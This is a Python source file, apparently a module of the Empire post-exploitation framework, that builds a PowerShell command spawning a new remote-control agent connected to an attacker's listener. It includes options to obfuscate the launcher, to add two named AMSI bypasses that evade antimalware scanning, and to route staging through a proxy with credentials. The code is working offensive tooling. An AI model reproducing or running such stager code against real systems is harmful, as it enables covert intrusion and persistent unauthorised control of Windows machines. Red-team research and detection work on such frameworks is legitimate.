from __future__ import print_function

from builtins import object

from lib.common import helpers


class Module(object):

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Spawn',

            'Author': ['@harmj0y'],

            'Description': ('Spawns a new agent in a new powershell.exe process.'),

            'Software': '',

            'Techniques': ['T1055'],

            'Background' : False,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : True,

            'Language' : 'powershell',

            'MinLanguageVersion' : '2',
            
            'Comments': []
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Obfuscate': {
                'Description': 'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
                'Required': False,
                'Value': 'False'
            },
            'ObfuscateCommand': {
                'Description': 'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
                'Required': False,
                'Value': r'Token\All\1'
            },
            'AMSIBypass': {
                'Description': 'Include mattifestation\'s AMSI Bypass in the stager code.',
                'Required': False,
                'Value': 'True'
            },
            'AMSIBypass2': {
                'Description': 'Include Tal Liberman\'s AMSI Bypass in the stager code.',
                'Required': False,
                'Value': 'False'
            },
            'SysWow64' : {
                'Description'   :   'Switch. Spawn a SysWow64 (32-bit) powershell.exe.',
                'Required'      :   False,
                'Value'         :   ''
            },            
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):
        # Set booleans to false by default
        Obfuscate = False
        AMSIBypass = False
        AMSIBypass2 = False

        # extract all of our options
        listenerName = self.options['Listener']['Value']
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']
        sysWow64 = self.options['SysWow64']['Value']

        # staging options
        if (self.options['Obfuscate']['Value']).lower() == 'true':
            Obfuscate = True
        ObfuscateCommand = self.options['ObfuscateCommand']['Value']
        if (self.options['AMSIBypass']['Value']).lower() == 'true':
            AMSIBypass = True
        if (self.options['AMSIBypass2']['Value']).lower() == 'true':
            AMSIBypass2 = True

        # generate the launcher script
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True,
                                                           obfuscate=Obfuscate,
                                                           obfuscationCommand=ObfuscateCommand, userAgent=userAgent,
                                                           proxy=proxy,
                                                           proxyCreds=proxyCreds, AMSIBypass=AMSIBypass,
                                                           AMSIBypass2=AMSIBypass2)

        if launcher == "":
            print(helpers.color("[!] Error in launcher command generation."))
            return ""
        else:
            # transform the backdoor into something launched by powershell.exe
            # so it survives the agent exiting  
            if sysWow64.lower() == "true":
                stagerCode = "$Env:SystemRoot\\SysWow64\\WindowsPowershell\\v1.0\\" + launcher
            else:
                stagerCode = "$Env:SystemRoot\\System32\\WindowsPowershell\\v1.0\\" + launcher

            parts = stagerCode.split(" ")

            script = "Start-Process -NoNewWindow -FilePath \"%s\" -ArgumentList '%s'; 'Agent spawned to %s'" % (parts[0], " ".join(parts[1:]), listenerName)

        if obfuscate:
            script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
        script = helpers.keyword_obfuscation(script)

        return script
